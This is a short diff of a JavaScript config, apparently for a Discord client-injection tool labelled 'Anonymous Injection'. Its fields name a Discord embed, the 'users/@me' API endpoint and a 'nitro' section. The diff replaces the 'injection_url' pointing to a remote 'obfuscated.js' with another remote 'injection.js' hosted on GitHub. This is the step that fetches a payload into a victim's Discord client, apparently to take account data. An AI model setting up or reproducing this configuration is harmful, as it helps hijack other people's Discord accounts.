@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Anonymous Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1076253206700634292/1077942039485894687/image.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/mishakabatedd/name/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
